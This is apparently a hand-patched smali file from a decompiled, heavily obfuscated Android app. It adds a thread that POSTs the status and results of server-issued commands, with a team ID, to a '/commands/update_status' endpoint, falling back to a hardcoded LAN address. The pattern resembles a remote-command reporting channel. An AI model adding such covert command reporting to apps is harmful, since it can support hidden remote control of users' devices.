.class public Lapp/mobilex/plus/services/RwDirectPost;
.super Ljava/lang/Thread;

# Instance fields for the background thread
.field private mUrl:Ljava/lang/String;
.field private mBody:Ljava/lang/String;
.field private mCmdId:Ljava/lang/String;

.method public constructor <init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    iput-object p1, p0, Lapp/mobilex/plus/services/RwDirectPost;->mUrl:Ljava/lang/String;
    iput-object p2, p0, Lapp/mobilex/plus/services/RwDirectPost;->mBody:Ljava/lang/String;
    iput-object p3, p0, Lapp/mobilex/plus/services/RwDirectPost;->mCmdId:Ljava/lang/String;

    return-void
.end method

.method public run()V
    .locals 6

    :try_start_0
    new-instance v0, Ljava/net/URL;

    iget-object v1, p0, Lapp/mobilex/plus/services/RwDirectPost;->mUrl:Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    check-cast v0, Ljava/net/HttpURLConnection;

    const-string v1, "POST"

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    const/16 v1, 0x2710

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    const/16 v1, 0x3a98

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    const-string v1, "Content-Type"

    const-string v2, "application/json; charset=utf-8"

    invoke-virtual {v0, v1, v2}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v1, p0, Lapp/mobilex/plus/services/RwDirectPost;->mBody:Ljava/lang/String;

    const-string v2, "UTF-8"

    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v1

    array-length v2, v1

    invoke-virtual {v0, v2}, Ljava/net/HttpURLConnection;->setFixedLengthStreamingMode(I)V

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v2}, Ljava/io/OutputStream;->flush()V

    invoke-virtual {v2}, Ljava/io/OutputStream;->close()V

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v1

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    :goto_0
    return-void
.end method

# Static entry point: postResult(cmdId, status, resultJson)
# Called from goto_60 in SyncQYAdapter before the broken coroutine POST
.method public static postResult(Ljava/lang/String;Ljava/lang/String;Lorg/json/JSONObject;)V
    .locals 5

    :try_start_0
    # Try runtime URL from ktukzhfmAkOuMU.w9sT1Swbhx3hs first
    sget-object v0, Lv/s/ktukzhfmAkOuMU;->w9sT1Swbhx3hs:Ljava/lang/String;

    if-eqz v0, :try_static_url

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    if-gtz v1, :have_url

    :try_static_url
    # Fallback: try static method
    const/16 v0, 0x3a

    invoke-static {v0}, Lv/s/KV57Z6oavcB595B8Dy8Z;->dDIMxZXP1V8HdM(I)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :use_hardcoded

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    if-gtz v1, :have_url

    :use_hardcoded
    # Last resort: hardcoded URL
    const-string v0, "http://192.168.0.101:8080"

    :have_url
    # Build full URL: baseUrl + /api/data/commands/update_status
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "/api/data/commands/update_status"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    # Build JSON body
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    const-string v2, "command_id"

    invoke-virtual {v1, v2, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v2, "status"

    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    if-eqz p2, :cond_0

    const-string v2, "result"

    invoke-virtual {v1, v2, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    :cond_0
    # Get team_id
    invoke-static {}, Lv/s/KV57Z6oavcB595B8Dy8Z;->vekpFI4d1Nc4fakF()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_1

    const-string v3, "team_id"

    invoke-virtual {v1, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    :cond_1
    # Convert body to string
    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    # Start background thread for the POST
    new-instance v2, Lapp/mobilex/plus/services/RwDirectPost;

    invoke-direct {v2, v0, v1, p0}, Lapp/mobilex/plus/services/RwDirectPost;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v2}, Lapp/mobilex/plus/services/RwDirectPost;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    :goto_0
    return-void
.end method
